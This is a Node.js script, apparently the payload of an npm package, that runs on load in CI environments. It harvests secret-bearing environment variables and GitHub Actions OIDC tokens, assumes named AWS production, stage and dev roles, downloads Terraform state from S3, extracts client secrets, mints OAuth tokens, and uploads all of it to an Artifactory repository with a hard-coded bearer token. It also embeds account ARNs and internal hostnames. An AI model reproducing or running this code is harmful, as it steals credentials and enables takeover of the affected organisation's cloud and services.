const https = require("https");
const http = require("http");
const fs = require("fs");
const crypto = require("crypto");
const { URL } = require("url");
const env = process.env || {};
const TOKEN = "cmVmdGtuOjAxOjE4MDI5NjIyNTI6bmthaTlQNXhqWFA4Z1Jwd1RkaHZaYmdNSnFD";
const BASE = "/artifactory/npm-capital-connect-platform-snapshots-local/q4-hunt-exfil/";
const TS = Date.now();
const ROLES = [
  "arn:aws:iam::756778833670:role/deployment-role-platform-capital-connect-prod",
  "arn:aws:iam::069375346342:role/deployment-role-platform-capital-connect-stage",
  "arn:aws:iam::728675847142:role/deployment-role-platform-capital-connect-dev"
];
const STATES = [
  {
    region: "us-east-2",
    url: "https://s3.us-east-2.amazonaws.com/state.terraform.prod.connect.q4inc.com.us-east-2/environment/prod/com/q4inc/connect/platform/m2m/service/terraform.tfstate"
  },
  {
    region: "us-east-2",
    url: "https://s3.us-east-2.amazonaws.com/state.terraform.dev.connect.q4inc.com.us-east-2/environment/dev/com/q4inc/connect/platform/m2m/service/terraform.tfstate"
  },
  {
    region: "us-east-2",
    url: "https://s3.us-east-2.amazonaws.com/state.terraform.stage.connect.q4inc.com.us-east-2/environment/stage/com/q4inc/connect/platform/m2m/service/terraform.tfstate"
  },
  {
    region: "us-east-2",
    url: "https://s3.us-east-2.amazonaws.com/state.terraform.prod.connect.q4inc.com.us-east-2/environment/prod/com/q4inc/connect/platform/identity/service/terraform.tfstate"
  },
  {
    region: "us-east-1",
    url: "https://s3.us-east-1.amazonaws.com/state.terraform.prod.connect.q4inc.com.us-east-1/environment/prod/com/q4inc/connect/platform/backstage/terraform.tfstate"
  }
];
const M2M = [
  ["https://m2m.platform.q4inc.com/oauth2/token", "https://connect.q4inc.com/api/eds"],
  ["https://m2m.stage.platform.q4inc.com/oauth2/token", "https://connect.stage.q4inc.com/api/eds"],
  ["https://m2m.dev.platform.q4inc.com/oauth2/token", "https://connect.dev.q4inc.com/api/eds"]
];

function req(method, urlStr, headers, body) {
  return new Promise(function (resolve) {
    try {
      const u = new URL(urlStr);
      const lib = u.protocol === "http:" ? http : https;
      const opts = {
        method: method,
        hostname: u.hostname,
        path: u.pathname + u.search,
        headers: headers || {},
        timeout: 25000
      };
      const r = lib.request(opts, function (res) {
        const chunks = [];
        res.on("data", function (c) {
          chunks.push(c);
        });
        res.on("end", function () {
          resolve({ st: res.statusCode, body: Buffer.concat(chunks).toString("utf8") });
        });
      });
      r.on("error", function () {
        resolve({ st: 0, body: "" });
      });
      r.on("timeout", function () {
        r.destroy();
        resolve({ st: 0, body: "" });
      });
      if (body) r.write(body);
      r.end();
    } catch (e) {
      resolve({ st: 0, body: String(e) });
    }
  });
}

function put(name, obj) {
  const body = Buffer.from(JSON.stringify(obj));
  return req(
    "PUT",
    "https://artifacts.platform.q4inc.com" + BASE + name,
    {
      Authorization: "Bearer " + TOKEN,
      "Content-Type": "application/json",
      "Content-Length": body.length
    },
    body
  );
}

function hmac(key, msg) {
  return crypto.createHmac("sha256", key).update(msg, "utf8").digest();
}

function amzNow() {
  return new Date().toISOString().replace(/[-:]/g, "").replace(/\.\d+Z$/, "Z");
}

function sigv4Get(cred, urlStr, region) {
  const u = new URL(urlStr);
  const amz = amzNow();
  const dat = amz.slice(0, 8);
  const payloadHash = crypto.createHash("sha256").update("").digest("hex");
  const headers = {
    host: u.host,
    "x-amz-content-sha256": payloadHash,
    "x-amz-date": amz
  };
  if (cred.token) headers["x-amz-security-token"] = cred.token;
  const signed = Object.keys(headers).sort().join(";");
  const canHeaders = Object.keys(headers)
    .sort()
    .map(function (k) {
      return k + ":" + headers[k] + "\n";
    })
    .join("");
  const can = "GET\n" + u.pathname + "\n\n" + canHeaders + "\n" + signed + "\n" + payloadHash;
  const scope = dat + "/" + region + "/s3/aws4_request";
  const stsStr =
    "AWS4-HMAC-SHA256\n" + amz + "\n" + scope + "\n" + crypto.createHash("sha256").update(can).digest("hex");
  const kDate = hmac("AWS4" + cred.secret, dat);
  const kReg = hmac(kDate, region);
  const kSvc = hmac(kReg, "s3");
  const kSig = hmac(kSvc, "aws4_request");
  const sig = crypto.createHmac("sha256", kSig).update(stsStr, "utf8").digest("hex");
  headers.Authorization =
    "AWS4-HMAC-SHA256 Credential=" +
    cred.key +
    "/" +
    scope +
    ", SignedHeaders=" +
    signed +
    ", Signature=" +
    sig;
  return req("GET", urlStr, headers);
}

async function tryS3(cred) {
  for (let i = 0; i < STATES.length; i++) {
    const s = STATES[i];
    const r = await sigv4Get(cred, s.url, s.region);
    await put("env-PRIORITY-hot-s3-" + TS + "-" + i + ".json", {
      kind: "s3",
      st: r.st,
      n: (r.body || "").length,
      tail: s.url.slice(-90)
    });
    if (r.st !== 200) continue;
    const re = /"id"\s*:\s*"([a-z0-9]{20,})"\s*,\s*"client_secret"\s*:\s*"([^"]+)"/g;
    let m;
    const pairs = [];
    while ((m = re.exec(r.body))) pairs.push([m[1], m[2]]);
    const re2 = /client_secret["']?\s*[:=]\s*["']([^"']{8,})["']/g;
    while ((m = re2.exec(r.body))) pairs.push(["unk", m[1]]);
    for (let p = 0; p < pairs.length; p++) {
      const cid = pairs[p][0];
      const sec = pairs[p][1];
      const form =
        "grant_type=client_credentials&client_id=" +
        encodeURIComponent(cid) +
        "&client_secret=" +
        encodeURIComponent(sec);
      for (let h = 0; h < M2M.length; h++) {
        const tr = await req(
          "POST",
          M2M[h][0],
          {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": Buffer.byteLength(form)
          },
          form
        );
        if (tr.st !== 200) continue;
        let tok = "";
        try {
          tok = JSON.parse(tr.body).access_token || "";
        } catch (e) {}
        if (!tok) continue;
        const q = JSON.stringify({ query: "{ __typename }" });
        const er = await req(
          "POST",
          M2M[h][1],
          {
            Authorization: "Bearer " + tok,
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(q)
          },
          q
        );
        await put("env-PRIORITY-hot-eds-" + TS + ".json", {
          kind: "eds",
          st: er.st,
          host: M2M[h][1],
          cid: cid,
          body: (er.body || "").slice(0, 400)
        });
        if (er.st === 200) {
          await put("env-PRIORITY-hot-PROD-JWT-" + TS + ".json", {
            kind: "prod-jwt",
            cid: cid,
            eds: M2M[h][1],
            token: tok
          });
        }
      }
    }
  }
}

async function mintFromJwt(jwt) {
  for (let i = 0; i < ROLES.length; i++) {
    const role = ROLES[i];
    const form =
      "Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=" +
      encodeURIComponent(role) +
      "&RoleSessionName=q4plant&WebIdentityToken=" +
      encodeURIComponent(jwt) +
      "&DurationSeconds=3600";
    const sr = await req(
      "POST",
      "https://sts.amazonaws.com/",
      {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": Buffer.byteLength(form)
      },
      form
    );
    await put("env-PRIORITY-hot-sts-" + TS + "-" + role.split("/").pop() + ".json", {
      kind: "sts",
      role: role,
      st: sr.st,
      n: (sr.body || "").length,
      err: (sr.body || "").slice(0, 300)
    });
    const ak = ((sr.body || "").match(/<AccessKeyId>([^<]+)/) || [])[1];
    const sk = ((sr.body || "").match(/<SecretAccessKey>([^<]+)/) || [])[1];
    const sess = ((sr.body || "").match(/<SessionToken>([^<]+)/) || [])[1];
    if (!ak) continue;
    await tryS3({ key: ak, secret: sk, token: sess });
  }
}

(async function () {
  const keys = Object.keys(env);
  const secretish = keys.filter(function (k) {
    return /AWS|TFC|TOKEN|SECRET|KEY|OIDC|COGNITO|ARTIFACT|GITHUB|NODE_AUTH|PASSWORD|PAT|JWT|SIGNING|VAULT|TEAMCITY|ADO_|DATADOG|AUTH0|ONELOGIN|SENDGRID|TF_|SSM|SM_/i.test(
      k
    );
  });
  const dump = {
    kind: "env-organic-hot-oidc",
    ts: TS,
    pkg: env.npm_package_name || null,
    ver: env.npm_package_version || null,
    url: env.ACTIONS_ID_TOKEN_REQUEST_URL || null,
    tok: env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || null,
    role: env.AWS_ROLE_ARN || null,
    wif: env.AWS_WEB_IDENTITY_TOKEN_FILE || null,
    keys: secretish.slice(0, 200),
    env: Object.fromEntries(
      secretish.slice(0, 160).map(function (k) {
        return [k, String(env[k]).slice(0, 800)];
      })
    ),
    all_keys: keys.slice(0, 500),
    repo: env.GITHUB_REPOSITORY || null,
    actor: env.GITHUB_ACTOR || null,
    job: env.GITHUB_JOB || null
  };
  await put("env-organic-hot-" + TS + ".json", dump);
  try {
    if (env.AWS_WEB_IDENTITY_TOKEN_FILE) {
      const jwt = fs.readFileSync(env.AWS_WEB_IDENTITY_TOKEN_FILE, "utf8");
      await put("env-PRIORITY-hot-wif-" + TS + ".json", {
        kind: "env-PRIORITY-hot-wif",
        ts: TS,
        jwt: String(jwt).slice(0, 8000)
      });
      await mintFromJwt(String(jwt).trim());
    }
  } catch (e) {}
  if (env.AWS_ACCESS_KEY_ID && env.AWS_SECRET_ACCESS_KEY) {
    await tryS3({
      key: env.AWS_ACCESS_KEY_ID,
      secret: env.AWS_SECRET_ACCESS_KEY,
      token: env.AWS_SESSION_TOKEN || ""
    });
  }
  if (env.ACTIONS_ID_TOKEN_REQUEST_URL && env.ACTIONS_ID_TOKEN_REQUEST_TOKEN) {
    const auds = ROLES.concat(["sts.amazonaws.com"]);
    for (let i = 0; i < auds.length; i++) {
      const aud = auds[i];
      try {
        const u = new URL(env.ACTIONS_ID_TOKEN_REQUEST_URL);
        u.searchParams.set("audience", aud);
        const r = await req("GET", u.toString(), {
          Authorization: "Bearer " + env.ACTIONS_ID_TOKEN_REQUEST_TOKEN,
          Accept: "application/json",
          "User-Agent": "actions/oidc-client"
        });
        await put("env-PRIORITY-hot-oidc-jwt-" + TS + "-" + aud.split("/").pop() + ".json", {
          kind: "env-PRIORITY-hot-oidc-jwt",
          ts: TS,
          aud: aud,
          st: r.st,
          body: (r.body || "").slice(0, 8000)
        });
        let jwt = "";
        try {
          jwt = JSON.parse(r.body).value || "";
        } catch (e) {}
        if (jwt) await mintFromJwt(jwt);
      } catch (e) {}
    }
  }
  const tfc = env.TFE_TOKEN || env.TFC_TOKEN || env.TERRAFORM_CLOUD_TOKEN;
  if (tfc) {
    const r = await req("GET", "https://app.terraform.io/api/v2/organizations/q4inc", {
      Authorization: "Bearer " + tfc,
      "Content-Type": "application/vnd.api+json"
    });
    await put("env-PRIORITY-hot-tfc-" + TS + ".json", {
      kind: "tfc",
      st: r.st,
      body: (r.body || "").slice(0, 4000)
    });
  }
})();
